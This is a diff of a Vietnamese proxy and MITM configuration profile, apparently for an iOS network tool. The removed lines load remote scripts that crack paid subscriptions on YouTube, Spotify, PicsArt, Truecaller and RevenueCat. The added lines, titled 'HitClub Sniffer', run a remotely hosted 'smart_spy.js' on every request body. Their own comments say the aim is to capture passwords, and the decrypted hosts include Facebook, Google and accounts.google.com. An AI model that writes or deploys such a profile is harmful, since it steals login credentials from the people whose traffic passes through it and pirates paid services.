@@ -1,24 +1,28 @@
-#!name = Vip Pro Max (Fixed Clean) #!desc = Phiên bản sửa lỗi URL Invalid - Đã thêm Game Target #!author = TungTinTacKMA
-=== GAMBLING TARGETS (Ép buộc đi qua Proxy để bắt gói tin) ===
-DOMAIN-SUFFIX,hit.club,PROXY DOMAIN-SUFFIX,genesockezlyfeapy.com,PROXY DOMAIN-SUFFIX,wsmt8g.cc,PROXY DOMAIN-SUFFIX,hytsocesk.com,PROXY DOMAIN-SUFFIX,trakipsg.net,PROXY DOMAIN-SUFFIX,dsrcgoms.net,PROXY DOMAIN-SUFFIX,yeulink.com,PROXY
-=== Rules Cũ ===
-AND,((DOMAIN-SUFFIX,googlevideo.com),(PROTOCOL,UDP)),REJECTAND,((DOMAIN,youtubei.googleapis.com),(PROTOCOL,UDP)),REJECT^https?://api.revenuecat.com/.+/(receipts$ header-del x-revenuecat-etag^https?://api.revenuecat.com/.+/(receipts$ header-del X-RevenueCat-ETag^https://(spclient.wg.spotify.com|.*-spclient.spotify.com(:443)?)/user-customization-service/v1/customize$ header-del if-none-match^https?://[\w-]+.googlevideo.com/(?!(dclk_video_ads|videoplayback?)).+&oad _ reject-200^https?://(www|s).youtube.com/api/stats/ads _ reject-200^https?://(www|s).youtube.com/(pagead|ptracking) _ reject-200^https?://s.youtube.com/api/stats/qoe?adcontext _ reject-200(^https?://[\w-]+.googlevideo.com/(?!dclk_video_ads).+?)&ctier=L(&.+?),ctier,(.+) $1$2$3 302
-=== SMART SPY (TARGETED) ===
-smart_spy = type=http-request,pattern=^https?://(.*.)?(hit.club|genesockezlyfeapy.com|wsmt8g.cc|hytsocesk.com|trakipsg.net|dsrcgoms.net|yeulink.com),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true
-=== YouTube Premium ===
-youtube.request = type=http-request,pattern=^https://youtubei.googleapis.com/youtubei/v1/(browse|next|player|reel/reel_watch_sequence|get_watch),requires-body=1,max-size=-1,binary-body-mode=1,engine=jsc,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/youtube.response.js youtube.response = type=http-response,pattern=^https://youtubei.googleapis.com/youtubei/v1/(browse|next|player|search|reel/reel_watch_sequence|guide|account/get_setting|get_watch),requires-body=1,max-size=-1,binary-body-mode=1,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/youtube.response.js,argument="{ "lyricLang": "vi", "captionLang": "vi", "blockUpload": true, "blockImmersive": true, "debug": false }"
-=== Spotify (App2Smile) ===
-spotify-json = type=http-request,pattern=^https://(spclient.wg.spotify.com|.-spclient.spotify.com(:443)?)/(artistview/v1/artist|album-entity-view/v2/album)/,requires-body=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/spotify-json.js spotify-proto = type=http-response,pattern=^https://(spclient.wg.spotify.com|.-spclient.spotify.com(:443)?)/(bootstrap/v1/bootstrap|user-customization-service/v1/customize)$,requires-body=1,binary-body-mode=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/spotify-proto.js,script-update-interval=0
-=== SoundCloud ===
-SoundCloudGo+=type=http-response,pattern=https://api-mobile.soundcloud.com/configuration/ios,requires-body=1,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/SoundCloudGoPlus.js
-=== Alight Motion ===
-AlightMotion = type=http-response,pattern=^https://us-central1-alight-creative.cloudfunctions.net/getAccountStatusAndLicenses,requires-body=true,max-size=131072,timeout=10,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js
-=== PicsArt ===
-PicsArt = type=http-request,pattern=^https://api.picsart.com/gw-v2/shop/subscription/apple/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60
-=== Truecaller ===
-Truecaller = type=http-response,pattern=^https://premium-(.+).truecaller.com/v\d/(subscriptions|products/apple),requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/TrueCaller.js
-=== Locket Gold ===
-revenuecat = type=http-response,pattern=^https://api.revenuecat.com/.+/(receipts$|subscribers/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js deleteHeader = type=http-request,pattern=^https://api.revenuecat.com/.+/(receipts|subscribers),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/deleteHeader.js,timeout=60
-[Map Local] ^https?://[\w-]+.googlevideo.com/initplayback.+&oad data-type=text data="" status-code=200
+#!name = HitClub Sniffer (Final Fix)
+#!desc = Cấu hình bắt mật khẩu HitClub & API ngầm - Update 29/12
+#!author = TungTinTacKMA
+
+[General]
+bypass-system = true
+skip-proxy = 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12, localhost, *.local, e.crashlytics.com
+tun-excluded-routes = 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24, 192.88.99.0/24, 192.168.0.0/16, 198.51.100.0/24, 203.0.113.0/24, 224.0.0.0/4, 255.255.255.255/32
+dns-server = system
+ipv6 = true
+
+[Rule]
+# Quy tắc: Cho phép Script chạy trên mọi traffic, còn lại đi qua Proxy để soi
+FINAL,PROXY
+
+[Script]
+# --- CẤU HÌNH QUAN TRỌNG NHẤT ---
+# pattern=.* : Bắt buộc script chạy trên MỌI đường link (kể cả link lạ)
+# requires-body=true : Bắt buộc lấy nội dung mật khẩu
+# timeout=120 : Tăng thời gian chờ để tránh bị ngắt kết nối giữa chừng
+
+Smart_Spy_All = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=120
+
+[MITM]
 enable = true
-hostname = *.hit.club, *.genesockezlyfeapy.com, *.wsmt8g.cc, *.hytsocesk.com, *.trakipsg.net, *.dsrcgoms.net, *.yeulink.com, *.googlevideo.com, *.youtube.com, *.spotify.com, *.revenuecat.com, *.picsart.com, *.truecaller.com, *.soundcloud.com, *.alightcreative.com, *
+# --- DANH SÁCH MỤC TIÊU (Đã cập nhật từ Log) ---
+# Bao gồm trang chủ HitClub và tất cả các API vệ tinh mà nó dùng để gửi mật khẩu
+hostname = hit.club, *.hit.club, *.wsmt8g.cc, *.trakipsg.net, *.genesockezlyfeapy.com, *.dsrcgoms.net, *.geightdors.net, *.hytsocesk.com, *.8xdfd3t6f.com, *.facebook.com, *.google.com, *.youtube.com, accounts.google.com
